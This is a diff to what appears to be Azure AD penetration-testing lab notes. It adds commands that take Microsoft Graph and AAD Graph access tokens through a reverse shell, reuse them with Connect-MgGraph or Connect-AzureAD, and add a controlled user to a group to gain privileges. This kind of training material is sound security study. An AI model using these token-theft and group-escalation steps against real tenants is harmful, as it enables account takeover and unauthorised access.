@@ -635,22 +635,34 @@ az automation account list
 - check for objects owned by the current user:
 ```az ad signed-in-user list-owned-objects```
 
-#### Further recon on Student VM
+#### Steal tokens for Student VM
 
-- To be able to interact with Azure AD, request a token for the ms-graph. We can use that token with the MS Graph module: 
+- To be able to interact with Azure AD, request a token for graph. We can use that token with either module: 
 ```
 az account get-access-token --resource-type ms-graph
+$mgToken = 'eyJ0..'
+az account get-access-token --resource-type aad-graph
+$aadToken = 'eyJ0..'
 ```
 
-- Now that we have his token, we can use it from our student VM, not rely on the brittle Reverse shell:
+- Now that we have his token, we can use it from our student VM, not rely on the brittle Reverse shell, using MG:
 ```
-$Token = “eyJ0..”
-Connect-MgGraph -AccessToken
+Connect-MgGraph -AccessToken ($mgToken | ConvertTo-SecureString -AsPlainText -Force)
 ```
+Or using AzureAD:
+```
+Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
+Connect-AzureAD -AadAccessToken $aadToken -TenantId 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
+```
+#### Adding to group 
 - Now, let's add Mark as a member of the group. In the below command ```–GroupId``` is for the group object id.
 ```
 $params = @{"@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3"}
 New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParameter $params
+```
+OR AAD:
+```
+Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
 ```
 
 - Now, we can use az cli to check for automation accounts. Run the below command on the reverse shell:
